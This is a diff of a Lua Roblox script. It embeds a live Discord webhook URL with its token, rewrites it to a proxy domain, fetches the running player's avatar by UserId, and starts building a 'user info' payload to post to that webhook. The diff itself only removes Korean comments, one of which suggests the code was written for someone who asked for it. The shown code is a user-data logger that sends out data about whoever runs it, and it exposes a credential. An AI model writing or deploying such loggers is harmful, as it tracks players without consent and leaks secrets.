@@ -1,7 +1,6 @@
 local discord = "https://discord.com/api/webhooks/1513059320353525891/45J_BqKT84C3zVUQ3_DdewFDvO0WN28DSm4jc26Zx0aaY952zPScRh2_Rz6TgF-8WaiA"
 
 if not discord or discord == "" then return end
--- 질문자님이 이전 형식이 작동했다고 하셨으므로, 그 치환 방식을 그대로 유지합니다.
 if discord:find("discord.com") then discord = discord:gsub("discord.com", "webhook.lewisakura.moe") end
 if discord:find("discordapp.com") then discord = discord:gsub("discordapp.com", "webhook.lewisakura.moe") end
 
@@ -14,7 +13,7 @@ if not r then return end
 
 local pleasework = "https://www.roblox.com/images/PersonalChannel/missing_avatar.png"
 
--- 아바타 로드
+
 task.spawn(function()
     pcall(function()
         local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. LocalPlayer.UserId .. "&size=420x420&format=Png&isCircular=false"
@@ -30,7 +29,7 @@ end)
 
 task.wait(1.5)
 
--- 유저 정보 전송
+
 local fields = {
     {
         name = "👤 유저 정보",
